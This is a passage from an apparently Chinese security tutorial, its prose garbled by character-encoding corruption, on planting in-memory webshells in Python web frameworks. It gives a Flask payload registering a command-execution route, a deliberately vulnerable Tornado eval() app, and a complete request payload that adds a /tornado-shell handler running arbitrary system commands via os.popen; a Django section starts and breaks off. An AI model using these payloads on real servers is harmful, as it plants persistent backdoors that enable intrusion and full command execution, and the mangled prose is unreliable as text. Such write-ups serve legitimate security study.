<p>ä¹‹åå†æ„é€ ç¬¬äºŒæ¡è¯·æ±‚ï¼Œå‘ <code>view_functions</code> ä¸­å¢åŠ å¯¹åº” <code>endpoint</code> çš„å®ç°ã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">app</span><span class="o">.</span><span class="n">view_functions</span><span class="o">.</span><span class="n">update</span><span class="p">({</span><span class="s1">&#39;shell&#39;</span><span class="p">:</span> <span class="k">lambda</span><span class="p">:</span><span class="nb">__import__</span><span class="p">(</span><span class="s1">&#39;os&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="n">request_context</span><span class="o">.</span><span class="n">top</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;cmd&#39;</span><span class="p">,</span> <span class="s1">&#39;whoami&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">read</span><span class="p">()})</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ä¸ºäº†çµæ´»æ€§è¿™é‡Œéœ€è¦httpä¼ å‚æ¥æ§åˆ¶æ‰§è¡Œçš„å‘½ä»¤ï¼Œä½†æ˜¯è¿™é‡Œä¼šå‘ç°ä¸Šä¸‹æ–‡ä¸­å¹¶ä¸å­˜åœ¨ <code>request_context</code>ï¼Œå½“å‰ <code>app</code> å¯¹è±¡ä¸­çš„ <code>request_context</code> æ˜¯ä¸€ä¸ªå‡½æ•°ã€‚</p>
<p>é‚£ä¹ˆå¯ä»¥é€šè¿‡å‡½æ•°çš„ <code>__globals__</code> å±æ€§æ¥è·å–å½“å‰çš„å…¨å±€å˜é‡å­—å…¸ï¼Œåœ¨è¿™å…¶ä¸­å°±æœ‰éœ€è¦çš„ <code>RequestContext</code> å¯¹è±¡ã€‚</p>
<p>æ‰€ä»¥æœ€ç»ˆpayload</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">app</span><span class="o">.</span><span class="n">view_functions</span><span class="o">.</span><span class="n">update</span><span class="p">({</span><span class="s1">&#39;shell&#39;</span><span class="p">:</span> <span class="k">lambda</span><span class="p">:</span><span class="nb">__import__</span><span class="p">(</span><span class="s1">&#39;os&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="n">app</span><span class="o">.</span><span class="n">request_context</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;request_ctx&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;cmd&#39;</span><span class="p">,</span> <span class="s1">&#39;whoami&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">read</span><span class="p">()})</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å°†ä¸¤æ¡payloadå‘é€å®Œæˆåï¼Œå³å¯æ–°å¢ä¸€æ¡ä»»æ„å‘½ä»¤æ‰§è¡Œçš„è·¯ç”± <code>/flask-shell</code></p>
<h2 id="tornado">Tornado
</h2><p>å‚è€ƒï¼š<a class="link" href="https://tiangonglab.github.io/blog/tiangongarticle038/"  target="_blank" rel="noopener"
    >Python Web å†…å­˜é©¬å¤šæ¡†æ¶æ¤å…¥æŠ€æœ¯è¯¦è§£ | å¤©å·¥å®éªŒå®¤</a></p>
<p>æ¼æ´ç¯å¢ƒ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">tornado</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">MainHandler</span><span class="p">(</span><span class="n">tornado</span><span class="o">.</span><span class="n">web</span><span class="o">.</span><span class="n">RequestHandler</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">get</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">result</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">get_argument</span><span class="p">(</span><span class="s1">&#39;expression&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s1">&#39;&lt;h2&gt;result: </span><span class="si">%s</span><span class="s1">!&lt;/h2&gt;&#39;</span> <span class="o">%</span> <span class="n">result</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">make_app</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">tornado</span><span class="o">.</span><span class="n">web</span><span class="o">.</span><span class="n">Application</span><span class="p">([</span>
</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="sa">r</span><span class="s2">&#34;/&#34;</span><span class="p">,</span> <span class="n">MainHandler</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="p">],</span> <span class="n">debug</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">autoreload</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">app</span> <span class="o">=</span> <span class="n">make_app</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">listen</span><span class="p">(</span><span class="mi">5000</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;listen: 5000&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">tornado</span><span class="o">.</span><span class="n">ioloop</span><span class="o">.</span><span class="n">IOLoop</span><span class="o">.</span><span class="n">instance</span><span class="p">()</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>Tornado</code> çš„è·¯ç”±ä¸€èˆ¬æƒ…å†µä¸‹éƒ½ä¼šåœ¨å®ä¾‹åŒ– <code>tornado.web.Application</code> çš„æ—¶å€™ä¼ å…¥ï¼Œæœ€åˆæƒ³åˆ°çš„åŠæ³•å’Œ <code>flask</code> ç›¸åŒï¼Œè€ƒè™‘æ˜¯å¦èƒ½æ‰¾åˆ°å…¶ä¸­å­˜æ”¾è·¯ç”±çš„åˆ—è¡¨æ¥ç›´æ¥æ“ä½œï¼Œåœ¨é˜…è¯» <code>Application</code> çš„ä»£ç æ—¶ç¡®å®å‘ç°åœ¨æ„é€ å‡½æ•°ä¸­å­˜åœ¨è¿™æ ·çš„åˆ—è¡¨ã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">handlers</span><span class="p">:</span> <span class="n">Optional</span><span class="p">[</span><span class="n">_RuleList</span><span class="p">]</span> <span class="o">=</span> <span class="kc">None</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">default_host</span><span class="p">:</span> <span class="n">Optional</span><span class="p">[</span><span class="nb">str</span><span class="p">]</span> <span class="o">=</span> <span class="kc">None</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">transforms</span><span class="p">:</span> <span class="n">Optional</span><span class="p">[</span><span class="n">List</span><span class="p">[</span><span class="n">Type</span><span class="p">[</span><span class="s2">&#34;OutputTransform&#34;</span><span class="p">]]]</span> <span class="o">=</span> <span class="kc">None</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="o">**</span><span class="n">settings</span><span class="p">:</span> <span class="n">Any</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">)</span> <span class="o">-&gt;</span> <span class="kc">None</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">wildcard_router</span> <span class="o">=</span> <span class="n">_ApplicationRouter</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">handlers</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">default_router</span> <span class="o">=</span> <span class="n">_ApplicationRouter</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">                <span class="bp">self</span><span class="p">,</span> <span class="p">[</span><span class="n">Rule</span><span class="p">(</span><span class="n">AnyMatches</span><span class="p">(),</span> <span class="bp">self</span><span class="o">.</span><span class="n">wildcard_router</span><span class="p">)]</span>
</span></span><span class="line"><span class="cl">        <span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å‘ç°åœ¨ <code>Application</code> ç±»ä¸­å­˜åœ¨ä¸€ä¸ªç±»ä¼¼äº <code>flask</code> ä¸­ <code>add_url_rule</code> çš„å‡½æ•° <code>add_handlers</code>ï¼Œè¿™ä¸ªå‡½æ•°ç”¨æ¥æ”¯æŒé…ç½®è™šæ‹Ÿä¸»æœºï¼Œå¹¶ä¸”åœ¨ä¹‹åä¼šå°†æŒ‡å®šçš„è·¯ç”±åŠ å…¥å½“å‰çš„è·¯ç”±è¡¨ä¸­ã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">add_handlers</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">host_pattern</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">host_handlers</span><span class="p">:</span> <span class="n">_RuleList</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="kc">None</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;Appends the given handlers to our handler list.
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">    Host patterns are processed sequentially in the order they were
</span></span></span><span class="line"><span class="cl"><span class="s2">    added. All matching patterns will be considered.
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">host_matcher</span> <span class="o">=</span> <span class="n">HostMatches</span><span class="p">(</span><span class="n">host_pattern</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">rule</span> <span class="o">=</span> <span class="n">Rule</span><span class="p">(</span><span class="n">host_matcher</span><span class="p">,</span> <span class="n">_ApplicationRouter</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">host_handlers</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="bp">self</span><span class="o">.</span><span class="n">default_router</span><span class="o">.</span><span class="n">rules</span><span class="o">.</span><span class="n">insert</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="n">rule</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">default_host</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">     <span class="bp">self</span><span class="o">.</span><span class="n">wildcard_router</span><span class="o">.</span><span class="n">add_rules</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">    <span class="p">[(</span><span class="n">DefaultHostMatches</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">host_matcher</span><span class="o">.</span><span class="n">host_pattern</span><span class="p">),</span> <span class="n">host_handlers</span><span class="p">)]</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">add_rules</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">rules</span><span class="p">:</span> <span class="n">_RuleList</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="kc">None</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;Appends new rules to the router.
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">    :arg rules: a list of Rule instances (or tuples of arguments, which are
</span></span></span><span class="line"><span class="cl"><span class="s2">    passed to Rule constructor).
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">rule</span> <span class="ow">in</span> <span class="n">rules</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">rule</span><span class="p">,</span> <span class="p">(</span><span class="nb">tuple</span><span class="p">,</span> <span class="nb">list</span><span class="p">)):</span>
</span></span><span class="line"><span class="cl">        <span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">rule</span><span class="p">)</span> <span class="ow">in</span> <span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">rule</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">basestring_type</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="n">rule</span> <span class="o">=</span> <span class="n">Rule</span><span class="p">(</span><span class="n">PathMatches</span><span class="p">(</span><span class="n">rule</span><span class="p">[</span><span class="mi">0</span><span class="p">]),</span> <span class="o">*</span><span class="n">rule</span><span class="p">[</span><span class="mi">1</span><span class="p">:])</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">rule</span> <span class="o">=</span> <span class="n">Rule</span><span class="p">(</span><span class="o">*</span><span class="n">rule</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="bp">self</span><span class="o">.</span><span class="n">rules</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">process_rule</span><span class="p">(</span><span class="n">rule</span><span class="p">))</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å‚æ•°æ„é€ </p>
<p>é¦–å…ˆçœ‹åˆ°è¿™ä¸ªå‡½æ•°å£°æ˜æ¥å—ä¸¤ä¸ªå‚æ•° <code>host_pattern</code> å’Œ <code>host_handlers</code>ï¼Œå…¶ä¸­ <code>host_pattern</code> æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²æ²¡æœ‰ä»€ä¹ˆéœ€è¦å¤šè€ƒè™‘çš„ï¼Œè¿™ä¸ªåœºæ™¯ä¸‹ç›´æ¥æ„é€  <code>.*</code> åŒ¹é…æ‰€æœ‰åŸŸåå³å¯ï¼Œè€Œç¬¬äºŒä¸ªå‚æ•° <code>host_handlers</code> è¾ƒä¸ºå¤æ‚ä¸€ç‚¹ï¼Œç±»å‹ä¸º <code>_RuleList</code>ï¼ŒæŸ¥çœ‹ä¸€ä¸‹è¿™ä¸ªç±»å‹å®šä¹‰ã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">_RuleList</span> <span class="o">=</span> <span class="n">List</span><span class="p">[</span>
</span></span><span class="line"><span class="cl">    <span class="n">Union</span><span class="p">[</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;Rule&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">List</span><span class="p">[</span><span class="n">Any</span><span class="p">],</span>  <span class="c1"># Can&#39;t do detailed typechecking of lists.</span>
</span></span><span class="line"><span class="cl">        <span class="n">Tuple</span><span class="p">[</span><span class="n">Union</span><span class="p">[</span><span class="nb">str</span><span class="p">,</span> <span class="s2">&#34;Matcher&#34;</span><span class="p">],</span> <span class="n">Any</span><span class="p">],</span>
</span></span><span class="line"><span class="cl">        <span class="n">Tuple</span><span class="p">[</span><span class="n">Union</span><span class="p">[</span><span class="nb">str</span><span class="p">,</span> <span class="s2">&#34;Matcher&#34;</span><span class="p">],</span> <span class="n">Any</span><span class="p">,</span> <span class="n">Dict</span><span class="p">[</span><span class="nb">str</span><span class="p">,</span> <span class="n">Any</span><span class="p">]],</span>
</span></span><span class="line"><span class="cl">        <span class="n">Tuple</span><span class="p">[</span><span class="n">Union</span><span class="p">[</span><span class="nb">str</span><span class="p">,</span> <span class="s2">&#34;Matcher&#34;</span><span class="p">],</span> <span class="n">Any</span><span class="p">,</span> <span class="n">Dict</span><span class="p">[</span><span class="nb">str</span><span class="p">,</span> <span class="n">Any</span><span class="p">],</span> <span class="nb">str</span><span class="p">],</span>
</span></span><span class="line"><span class="cl">    <span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="p">]</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>åœ¨ <code>add_rules</code> ä¸­ï¼Œæ•´ä¸ªä¼ å…¥çš„å€¼éƒ½ä¼šè¢«ä½œä¸ºæ„é€ å‚æ•°æ¥å®ä¾‹åŒ–ä¸€ä¸ª <code>Rule</code> å¯¹è±¡ï¼Œæ„é€ å‡½æ•°å¦‚ä¸‹ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">    <span class="bp">self</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">matcher</span><span class="p">:</span> <span class="s2">&#34;Matcher&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">target</span><span class="p">:</span> <span class="n">Any</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">target_kwargs</span><span class="p">:</span> <span class="n">Optional</span><span class="p">[</span><span class="n">Dict</span><span class="p">[</span><span class="nb">str</span><span class="p">,</span> <span class="n">Any</span><span class="p">]]</span> <span class="o">=</span> <span class="kc">None</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">name</span><span class="p">:</span> <span class="n">Optional</span><span class="p">[</span><span class="nb">str</span><span class="p">]</span> <span class="o">=</span> <span class="kc">None</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="p">)</span> <span class="o">-&gt;</span> <span class="kc">None</span><span class="p">:</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç¬¬ä¸€ä¸ªå‚æ•°ç±»å‹ä¸º <code>Matcher</code>ï¼Œå¦‚æœè‡ªå·±æ¥æ„é€ çš„è¯ä¼šæ¯”è¾ƒéº»çƒ¦ï¼Œä½†æ˜¯çœ‹åˆ° <code>add_rules</code> ä¸­çš„å¤„ç†ï¼Œä¼šåˆ¤æ–­ä¸€æ¬¡ä¼ å…¥å€¼ï¼Œå¦‚æœæ˜¯ <code>tuple</code> æˆ–è€… <code>list</code> å¹¶ä¸”ç¬¬ä¸€ä¸ªå€¼æ˜¯å­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆå°±ä¼šè°ƒç”¨ä¸€æ¬¡ <code>PathMatches</code> è¿”å›ä¸€ä¸ª <code>Matcher</code> å¯¹è±¡ï¼Œæ‰€ä»¥è¿™é‡Œè€ƒè™‘ç›´æ¥ä¼ å…¥è·¯ç”±å­—ç¬¦ä¸²ï¼Œè®©ç³»ç»Ÿæ¥åšä¸€æ¬¡è‡ªåŠ¨è½¬æ¢ã€‚</p>
<p>æ¥ä¸‹æ¥è€ƒè™‘è·¯ç”±å¯¹åº”çš„ <code>handler</code>, è¿™å¾€å¾€éœ€è¦æ˜¯ä¸€ä¸ª <code>tornado.web.RequestHandler</code> çš„å­ç±»ï¼Œé‚£ä¹ˆè¿™é‡Œå¯ä»¥ç›´æ¥ä½¿ç”¨ <code>type</code> å‡½æ•°æ¥åˆ›å»ºä¸€ä¸ªå¯¹åº”åŸºç±»çš„å¯¹è±¡ï¼Œå½“ <code>type</code> å‡½æ•°æ¥å—ä¸‰ä¸ªå‚æ•°æ—¶ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ä¸ºç±»åï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºåŸºç±»å…ƒç»„ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°ä¸ºç±»å±æ€§/æ–¹æ³•çš„å­—å…¸ï¼Œå‡½æ•°åŸå‹å¦‚ä¸‹ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="nd">@overload</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">name</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">bases</span><span class="p">:</span> <span class="nb">tuple</span><span class="p">[</span><span class="nb">type</span><span class="p">,</span> <span class="o">...</span><span class="p">],</span> <span class="nb">dict</span><span class="p">:</span> <span class="nb">dict</span><span class="p">[</span><span class="nb">str</span><span class="p">,</span> <span class="n">Any</span><span class="p">],</span> <span class="o">/</span><span class="p">,</span> <span class="o">**</span><span class="n">kwds</span><span class="p">:</span> <span class="n">Any</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="kc">None</span><span class="p">:</span> <span class="o">...</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>æ‰€ä»¥ä½¿ç”¨ä¸‹é¢çš„payloadå³å¯åˆ›å»ºä¸€ä¸ªåˆæ³• <code>RequestHandler</code>ã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="nb">type</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;ShellHandler&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="n">tornado</span><span class="o">.</span><span class="n">web</span><span class="o">.</span><span class="n">RequestHandler</span><span class="p">,),</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;get&#39;</span><span class="p">:</span> <span class="k">lambda</span> <span class="bp">self</span><span class="p">:</span> <span class="bp">self</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="nb">__import__</span><span class="p">(</span><span class="s1">&#39;os&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="n">sef</span><span class="o">.</span><span class="n">get_argument</span><span class="p">(</span><span class="s1">&#39;cmd&#39;</span><span class="p">,</span> <span class="s1">&#39;id&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">read</span><span class="p">())</span> 
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å°†æ‰€æœ‰åˆ†æç»“åˆèµ·æ¥ï¼Œå³å¯åœ¨å½“å‰åœºæ™¯ä¸‹æ„é€ å‡ºä¸‹é¢çš„è¯·æ±‚payloadã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">127.0.0.1</span><span class="p">:</span><span class="mi">5000</span><span class="o">/</span><span class="err">?</span><span class="n">expression</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">application</span><span class="o">.</span><span class="n">add_handlers</span><span class="p">(</span><span class="s1">&#39;.*&#39;</span><span class="p">,</span> <span class="p">[</span><span class="s1">&#39;/tornado-shell&#39;</span><span class="p">,</span> <span class="nb">type</span><span class="p">(</span><span class="s1">&#39;ShellHandler&#39;</span><span class="p">,</span> <span class="p">(</span><span class="n">tornado</span><span class="o">.</span><span class="n">web</span><span class="o">.</span><span class="n">RequestHandler</span><span class="p">,),</span> <span class="p">{</span><span class="s1">&#39;get&#39;</span><span class="p">:</span> <span class="k">lambda</span> <span class="bp">self</span><span class="p">:</span> <span class="bp">self</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="nb">__import__</span><span class="p">(</span><span class="s1">&#39;os&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">get_argument</span><span class="p">(</span><span class="s1">&#39;cmd&#39;</span><span class="p">,</span> <span class="s1">&#39;id&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">read</span><span class="p">())})])</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ä¹‹åä¾¿å¯ä»¥è®¿é—® <code>/tornado-shell</code> æ¥æ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤ã€‚</p>
<h2 id="django">Django
</h2><p>æ¼æ´ä»£ç </p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># memshell/urls.py</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">django.contrib</span> <span class="kn">import</span> <span class="n">admin</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">django.urls</span> <span class="kn">import</span> <span class="n">path</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">.views</span> <span class="kn">import</span> <span class="n">calc</span>
</span></span><span class="line"><span class="cl">
